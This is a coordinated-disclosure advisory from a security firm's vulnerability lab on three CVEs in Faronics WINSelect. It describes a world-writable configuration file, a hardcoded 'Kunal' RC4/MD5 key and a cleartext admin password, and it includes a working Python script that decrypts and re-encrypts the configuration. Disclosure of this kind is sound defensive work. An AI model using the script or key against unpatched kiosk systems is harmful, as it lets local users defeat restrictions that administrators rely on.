
Toggle Navbar

* [Career](/career/)
* [About us](/about-us/)
* [Contact](/contact/)

* EN
  + [DE](/de/vulnerability-lab/advisory/mehrere-schwachstellen-in-faronics-winselect-standard-enterprise/ "German")
Search

* Security Testing
  + [Web Application Security](/security-testing/web-application-security/)
  + [Penetration Testing](/security-testing/penetration-testing/)
  + [Mobile Security](/security-testing/mobile-security/)
  + [Cloud Security](/security-testing/cloud-security/)
  + [IT Infrastructure Security](/security-testing/it-infrastructure-security/)
  + [Security for SAP Services](/security-testing/security-for-sap-services/)
  + [IoT and Embedded Systems Security](/security-testing/iot-and-embedded-systems-security/)
  + [Red Teaming](/security-testing/red-teaming/)
* Processes & Organisation
  + [Information Security Management (ISM)](/processes-organisation/information-security-management-ism/)
  + [Network and Information Systems Security (NIS)](/processes-organisation/network-and-information-systems-security-nis/)
  + [OT Security](/processes-organisation/ot-security/)
  + [Secure Software Development Consulting](/processes-organisation/secure-software-development/)
  + [Red Teaming](/security-testing/red-teaming/)
  + [SEC Trainings](/processes-organisation/sec-trainings/)
  + [Project- und Program Management](/processes-organisation/project-und-program-management/)
* Incident Response
  + [SEC Defence](/incident-response/sec-defence/)
* [Vulnerability Lab](/vulnerability-lab/)
* [Blog](/blog/)
 [Incident?
Breached?
Report an incident](/incident-response/sec-defence/)

1. [Home](/)
2. [Vulnerability Lab](/vulnerability-lab/)
3. Multiple Vulnerabilities allowing complete bypass in Faronics WINSelect (Standard + Enterprise)
# Multiple Vulnerabilities allowing complete bypass in Faronics WINSelect (Standard + Enterprise)

Title

Multiple Vulnerabilities allowing complete bypass

Product

Faronics WINSelect (Standard + Enterprise)

Vulnerable Version

<8.30.xx.903

Fixed Version

8.30.xx.903

CVE Number

CVE-2024-36495, CVE-2024-36496, CVE-2024-36497

Impact

high

Homepage

[https://www.faronics.com/products/winselect](https://www.faronics.com/products/winselect "https://www.faronics.com/products/winselect")

Found

01.02.2024

By

Daniel Hirschberger (Office Bochum) | SEC Consult Vulnerability Lab

The product WINSelect from Faronics is used to restrict the possible actions of users on a system and can even be used to implement a Kiosk mode. Due to hardcoded credentials and an unfitting application architecture an attacker could decrypt the configuration file and retrieve the password which is used to configure the software. Thus, an attacker could completely disable the software.

## Vendor description

"*WINSelect - Allows you to easily control your end-users' Windows Experience without having to deal with GPOs. Need to Prevent Data From Leaving? Whether you're working on classified government files or the secret ingredient
 for your famous lasagna, you need to protect your sensitive information from walking out the door.*

*Faronics WINSelect offers the ability to disable USB ports and disk drives. Now you can relax knowing your secrets won't be exported without your knowledge*."

Source: <https://www.faronics.com/products/winselect>

## Business recommendation

The vendor provides a patched version which should be installed immediately. SEC Consult highly recommends to perform a thorough security review of the product conducted by security professionals to identify and resolve potential further security issues.

## Vulnerability overview/description

### 1) Read/Write Permissions for Everyone on Configuration File (CVE-2024-36495)

The application saves its configuration in an encrypted file which "Everyone" has read and write access to.

### 2) Hardcoded Credentials (CVE-2024-36496)

The configuration file is encrypted with a static key derived from a static five-character password which allows an attacker to decrypt this file.

### 3) Unhashed Storage of Password (CVE-2024-36497)

The decrypted configuration file contains the password in cleartext which is used to configure WINSelect. It can be used to remove the existing restrictions and disable WINSelect entirely.

By combining these issues any local attacker can disable WINSelect.

## Proof of concept

### 1) Read/Write Permissions for Everyone on Configuration File (CVE-2024-36495)

WINSelect Standard saves its configuration in the following file:

```
C:\ProgramData\WINSelect\WINSelect.wsd
```

Every user has read and write permissions on this file by default:

![](/fileadmin/user_upload/sec-consult/Dynamisch/Advisories/2024_06/sec-consult-c-winselect-read_write_everyone.png)

Figure 1: The write permission is no problem as long as WINSelect is running, because it is locked by the process WSEngine.exe.

For WINSelect Enterprise the path for the configuration file is:

```
C:\ProgramData\Faronics\StorageSpace\WS\WINSelect.wsd
```
### 2) Hardcoded Credentials (CVE-2024-36496)

By analyzing the application via the API Monitor tool, we found that the application uses a hardcoded five letter password, hashes it with the outdated and broken MD5 algorithm (no salt) and uses the first five bytes as the key for RC4. The configuration file is then encrypted with these parameters.

![](/fileadmin/user_upload/sec-consult/Dynamisch/Advisories/2024_06/sec-consult-c-winselect-rc4_md5.png)

Figure 2: After starting WINSelect.exe the MD5 and RC4 algorithms are requested

![](/fileadmin/user_upload/sec-consult/Dynamisch/Advisories/2024_06/sec-consult-c-winselect-login.png)

Figure 3: When the login to the configuration of WINSelect is triggered via CTRL+ALT+SHIFT+F8, the configuration file is decrypted

![](/fileadmin/_processed_/0/d/csm_sec-consult-c-winselect-hash_input_e97dabf439.png)

Figure 4: The hardcoded password "Kunal" is hashed.

![](/fileadmin/_processed_/f/0/csm_sec-consult-c-winselect-hash_output_0e9cd364a0.png)

Figure 5: Output of the hardcoded password hash

![](/fileadmin/user_upload/sec-consult/Dynamisch/Advisories/2024_06/sec-consult-c-winselect-key.png)

Figure 6: The first five bytes of the hash are used to instantiate a key object.

![](/fileadmin/_processed_/e/2/csm_sec-consult-c-winselect-decrypted_31d8d301af.jpeg)

Figure 7: The configuration is then decrypted with this key.

To simplify this proof of concept the following python script was developed which automatically decrypts an encrypted WINSelect.wsd:

```
import sys
from binascii import hexlify, unhexlify
import Crypto.Cipher.ARC4
from hashlib import md5

encoded = "Kunal".encode("utf-16le")
hashed = md5(encoded).digest()
key = hashed[:5] + 11 * b'\x00'

# hardcoded key
#key = b'9d62e7dd580000000000000000000000'
#key = unhexlify(key)
#print(key)

def main():
    if sys.argv[1] == "d":
        decrypt(sys.argv[2], sys.argv[3])
    elif sys.argv[1] == "e":
        encrypt(sys.argv[2], sys.argv[3])

def encrypt(file_in, file_out):
    with open(file_in, 'rb') as file:
        data = file.read()

    # Decrypt the data
    text = data.decode("utf-8").encode("utf-16le")
    encrypted = Crypto.Cipher.ARC4.new(key).encrypt(text)

    with open(file_out, 'wb') as file:
        file.write(b'\xff\xfe')
        file.write(encrypted)

def decrypt(file_in, file_out):
    # skip the first 2 bytes and read the beginning
    with open(file_in, 'rb') as file:
        file.seek(2)
        data = file.read()

    # Decrypt the data
    decrypted = Crypto.Cipher.ARC4.new(key).encrypt(data)
    text = decrypted.decode("utf-16le").encode("utf-8")

    with open(file_out, 'wb') as file:
        file.write(text)

if __name__ == "__main__":
    main()
```
### 3) Unhashed Storage of Password (CVE-2024-36497)

By decrypting the configuration file, the used password can be extracted at the beginning of the file:

```
<?xml version="1.0"?>
<KIOSK>
   <SECTIONS>
      <SECTION>
         <SID>194</SID><!--S_ID_ADMIN_PASS-->
            <RULES>
               <RULE>
                  <ID>121</ID><!--R_ID_PROTECTION_ON_OFF-->
                  <ENABLED>1</ENABLED>
               </RULE>
               <RULE>
                  <ID>148</ID><!--R_ID_PROTECTION_ON_OFF_ADMIN-->
                  <ENABLED>1</ENABLED>
               </RULE>
               <RULE>
                  <ID>116</ID><!--R_ID_ADMIN_PASS-->
                  <ENABLED>1</ENABLED>
               <DATA>
                  <PASSWORDSET>0</PASSWORDSET>
                  <ADMINPASSWORD>myadminpw</ADMINPASSWORD>
               </DATA>
```
## Vulnerable / tested versions

The following version has been tested which was the latest version available at the time of the test:

* 8.22.1112.886

## Vendor contact timeline

| 2024-02-19 | Contacting vendor through support@faronics.com and customerservice@faronics.com |
| --- | --- |
| 2024-02-20 | Vendor responds with an email address to which we shall send the advisory. |
| 2024-02-20 | Asking for encryption, vendor requests unencrypted communication, submitting advisory. |
| 2024-02-21 | Vendor confirms receipt, engaged with product and development teams. |
| 2024-02-27 | Vendor introduces additional contact, will coordinate further responses. |
| 2024-03-13 | Additional contact apologizes for delayed response, vulnerabilities already discussed internally. Asks for extension of release. |
| 2024-03-14 | Extending advisory release to coordinate with patch. |
| 2024-04-10 | Vendor has addressed the reported issues in a test build for the standard version, enterprise fixes will be incorporated soon. |
| 2024-04-18 | Giving feedback that the issue is still exploitable, proposing a better hash function and random UUID, linking to OWASP password storage cheat sheet. |
| 2024-04-21 | Vendor thanks us for the proposed fix, current patch must be released, but working on new version incorporating our feedback. |
| 2024-04-23 | Providing further feedback, especially regarding GPU attacks. |
| 2024-05-27 | Asking for a status update. |
| 2024-05-29 | Vendor's last email got stuck in their mailbox. The latest WINSelect patch was released in early May, now incorporates PBKDF2. Provides release and download URL. Reserving CVE numbers. |
| 2024-06-10 | We can confirm that the PBKDF2 is used with SHA256 and 600000 iterations |
| 2024-06-11 | Since the hardcoded password for the encryption is not fixed, we ask if this will be addressed as well. Vendor responds that this will be addressed in a future release. |
| 2024-06-24 | Coordinated release of security advisory. |

## Solution

The vendor provides a patched version 8.30.xx.903 since May 2024 which can be downloaded from the following URL:
<https://www.faronics.com/document-library/document/download-winselect-standard>

 The vendor provided the following changelog:
<https://www.faronics.com/en-uk/document-library/document/winselect-standard-release-notes>

## Workaround

None

## Advisory URL

<https://sec-consult.com/vulnerability-lab/>

EOF Daniel Hirschberger @2024

*Interested to work with the experts of SEC Consult? Send us your [application](https://sec-consult.com/career/)*

*Interested in improving your cyber security with the experts of SEC Consult? Contact our [local offices](https://sec-consult.com/contact/)*

[Back](/vulnerability-lab/)

* [Legal Notice](/legalnotice/)
* [Privacy Statement](/privacy-statement/)
* [Jobs](/career/)

SEC Consult is one of the leading consultancies in the field of cyber and [application security](/security-testing/web-application-security/ "Web Application Security"). The company specializes in [information security management](/processes-organisation/information-security-management-ism/ "Information Security Management (ISM)"), [NIS security audits](/processes-organisation/network-and-information-systems-security-nis/ "NIS security audits"), [penetration testing](/security-testing/penetration-testing/ "Pentesting (Pentest)"), ISO 27001 certification support, [Cyber Defence](/incident-response/sec-defence/ "Cyber Defence") and [secure software certification](/processes-organisation/secure-software-development/ "Secure Software Development Consulting"). SEC Consult is part of [Eviden](https://eviden.com/ "Link to Eviden website").

[![bsi ISO/IEC 27001 Information Security Management CERTIFIED](/typo3temp/assets/_processed_/c/2/csm_bsi_9a24e74563.png)](/about-us/ "About us")[![ISO 27001 CREST certified](/typo3temp/assets/_processed_/0/6/csm_crest_0eb9c5864d.png)](/about-us/ "About us")[![Great Place To Work AT certified](/typo3temp/assets/_processed_/0/3/csm_great-place-to-work-at_773b265aa6.png)](/about-us/ "About us")[![Great Place To Work DE certified](/typo3temp/assets/_processed_/d/6/csm_great-place-to-work-de_2fcb537270.png)](/about-us/ "About us")

## We use Cookies

We use cookies to offer you a perfect visit experience. These include cookies that are necessary for the operation of the site and for the control of our commercial corporate goals, as well as those that are only used for anonymous statistical purposes, for convenience settings or to display personalized content. Decide for yourself which categories you want to allow. Please note that based on your settings, not all functions of the site may be available.

**[Legal Notice](/legalnotice/)** •  **[Privacy Statement](/privacy-statement/)**

### Technically required

(
0
Service
)

no

Technically required (
0
Service
)

yes

### Analysis / statistics

(
1
Service
)

Anonymous evaluation for troubleshooting and further development

no

Analysis / statistics (
1
Service
)

yes

#### Matomo

no

Matomo

yes

Matomo.org
Show details

Hide details

**Purpose**: Error analysis, statistical evaluation of our website accesses, campaign analysis, conversion tracking.
 **Processing operations**: collection of access data, data from your browser and data about the content accessed; execution of analysis software and storage of data on your terminal device, anonymization of the data collected; evaluation of the anonymous data in the form of statistics.
 **Storage period**: 1 year.
 **Joint controller**: LimeSoda Interactive Marketing GmbH.
 **Legal basis for data processing**: Art. 6 para. 1 lit. f of the DSGVO.
 **Consequences of non-consent**: This basic tracking is absolutely necessary for the operation of our website.
 **Data transfer**: The data collected with Matomo is stored on our own servers. It is not passed on to third parties.

Accept selected

Reject all

Accept all

